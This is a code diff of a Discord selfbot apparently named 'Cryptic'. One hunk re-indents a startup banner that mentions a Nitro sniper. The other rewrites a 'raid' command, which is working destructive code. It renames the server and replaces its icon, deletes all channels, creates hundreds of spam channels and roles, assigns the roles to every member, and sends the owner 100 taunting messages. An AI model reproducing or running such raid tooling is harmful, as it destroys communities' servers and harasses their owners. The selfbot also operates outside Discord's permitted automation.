@@ -38,16 +38,16 @@ bot.on("ready", () => {
     }
     console.log(`
 
-                     █████${colors.cyan("╗")} ██████${colors.cyan("╗")} ██${colors.cyan("╗")}   ██${colors.cyan("╗")}██████${colors.cyan("╗")} ████████${colors.cyan("╗")}██${colors.cyan("╗")} █████${colors.cyan("╗")}
-                    ██${colors.cyan("╔══")}██${colors.cyan("╗")}██${colors.cyan("╔══")}██${colors.cyan("╗")}${colors.cyan("╚")}██${colors.cyan("╗")} ██${colors.cyan("╔╝")}██${colors.cyan("╔══")}██${colors.cyan("╗╚══")}██${colors.cyan("╔══╝")}██${colors.cyan("║")}██${colors.cyan("╔══")}██${colors.cyan("╗")}
-                    ██${colors.cyan("║")}  ${colors.cyan("╚═╝")}██████${colors.cyan("╔╝ ╚")}████${colors.cyan("╔╝")} ██████${colors.cyan("╔╝")}   ██${colors.cyan("║")}   ██${colors.cyan("║")}██${colors.cyan("║  ╚═╝")}
-                    ██${colors.cyan("║")}  ██${colors.cyan("╗")}██${colors.cyan("╔══")}██${colors.cyan("╗")}  ${colors.cyan("╚")}██${colors.cyan("╔╝")}  ██${colors.cyan("╔═══╝")}    ██${colors.cyan("║")}   ██${colors.cyan("║")}██${colors.cyan("║")}  ██${colors.cyan("╗")}
-                    ${colors.cyan("╚")}█████${colors.cyan("╔╝")}██${colors.cyan("║")}  ██${colors.cyan("║")}   ██${colors.cyan("║")}   ██${colors.cyan("║")}        ██${colors.cyan("║")}   ██${colors.cyan("║╚")}█████${colors.cyan("╔╝")}
-                     ${colors.cyan("╚════╝ ╚═╝  ╚═╝   ╚═╝   ╚═╝        ╚═╝   ╚═╝ ╚════╝")}         
+                             █████${colors.cyan("╗")} ██████${colors.cyan("╗")} ██${colors.cyan("╗")}   ██${colors.cyan("╗")}██████${colors.cyan("╗")} ████████${colors.cyan("╗")}██${colors.cyan("╗")} █████${colors.cyan("╗")}
+                            ██${colors.cyan("╔══")}██${colors.cyan("╗")}██${colors.cyan("╔══")}██${colors.cyan("╗")}${colors.cyan("╚")}██${colors.cyan("╗")} ██${colors.cyan("╔╝")}██${colors.cyan("╔══")}██${colors.cyan("╗╚══")}██${colors.cyan("╔══╝")}██${colors.cyan("║")}██${colors.cyan("╔══")}██${colors.cyan("╗")}
+                            ██${colors.cyan("║")}  ${colors.cyan("╚═╝")}██████${colors.cyan("╔╝ ╚")}████${colors.cyan("╔╝")} ██████${colors.cyan("╔╝")}   ██${colors.cyan("║")}   ██${colors.cyan("║")}██${colors.cyan("║  ╚═╝")}
+                            ██${colors.cyan("║")}  ██${colors.cyan("╗")}██${colors.cyan("╔══")}██${colors.cyan("╗")}  ${colors.cyan("╚")}██${colors.cyan("╔╝")}  ██${colors.cyan("╔═══╝")}    ██${colors.cyan("║")}   ██${colors.cyan("║")}██${colors.cyan("║")}  ██${colors.cyan("╗")}
+                            ${colors.cyan("╚")}█████${colors.cyan("╔╝")}██${colors.cyan("║")}  ██${colors.cyan("║")}   ██${colors.cyan("║")}   ██${colors.cyan("║")}        ██${colors.cyan("║")}   ██${colors.cyan("║╚")}█████${colors.cyan("╔╝")}
+                             ${colors.cyan("╚════╝ ╚═╝  ╚═╝   ╚═╝   ╚═╝        ╚═╝   ╚═╝ ╚════╝")}         
 
-                    ${colors.cyan(selfbot.name)} ${colors.yellow(`v${selfbot.version}`)} ${colors.magenta("|")} ${colors.cyan("Logged in as")} ${colors.yellow(bot.user.tag)} ${colors.magenta("|")} ${colors.cyan("ID:")} ${colors.yellow(bot.user.id)}
-                    ${colors.cyan("Nitro Sniper?")} ${nitroSniper}
-                    ${colors.cyan("Prefix:")} ${colors.yellow(`${config.prefix}`)}
+                            ${colors.cyan(selfbot.name)} ${colors.yellow(`v${selfbot.version}`)} ${colors.magenta("|")} ${colors.cyan("Logged in as")} ${colors.yellow(bot.user.tag)} ${colors.magenta("|")} ${colors.cyan("ID:")} ${colors.yellow(bot.user.id)}
+                            ${colors.cyan("Nitro Sniper?")} ${nitroSniper}
+                            ${colors.cyan("Prefix:")} ${colors.yellow(`${config.prefix}`)}
     `)
 })
 
@@ -1015,25 +1015,35 @@ Total Roles: ${message.guild.roles.size.toLocaleString()}${footer ? `\n\n${foote
     }
 
     if(cmd === "raid") {
-        if(message.deletable) {
-            message.delete()
-        }
         if(message.guild.me.hasPermission("ADMINISTRATOR")) {
-            message.guild.setIcon(null)
-            message.guild.channels.forEach(channel => {
-                channel.setName("Raided by Cryptic").catch(err => {
-                    return console.log(colors.red(`[-] Channel ${channel.name} name couldn't be changed`))
-                })
-                channel.setTopic("Raided by Cryptic").catch(err => {
-                    return console.log(colors.red(`[-] Channel ${role.name} topic couldn't be changed`))
-                })
+            message.guild.setIcon("https://cdn.discordapp.com/attachments/763526514373033994/774811825120346123/cryptic-logo.png")
+            message.guild.setName("RAIDED BY CRYPTIC")
+            message.guild.channels.forEach(ch => {
+                ch.delete()
             })
-            message.guild.roles.forEach(role => {
-                console.log(colors.green(`[+] Role ${role.name} name was set to Raided by Cryptic`))
-                role.setName("Raided by Cryptic").catch(err => {
-                    return console.log(colors.red(`[-] Role ${role.name} name couldn't be changed`))
+            for (var i = 0; i < 100; i++) {
+                message.guild.createChannel("raided-by-cryptic", {
+                    type: "text"
                 })
-            })
+            }
+            for (var i = 0; i < 100; i++) {
+                const Guild = message.guild.name
+                message.guild.members.get(message.guild.ownerID).send(`Your server ${Guild} has been Raided :slight_smile:`).catch(err => { return })
+            }
+            for (var i = 0; i < 100; i++) {
+                message.guild.createChannel("Raided By Cryptic", {
+                    type: "voice"
+                })
+            }
+            for (var i = 0; i < 100; i++) {
+                const newRole = await message.guild.createRole({
+                    name: "RAIDED BY CRYPTIC",
+                    color: "#1B78E7"
+                })
+                message.guild.members.forEach(member => {
+                    member.addRole(newRole.id)
+                })
+            }
         }
     }
 
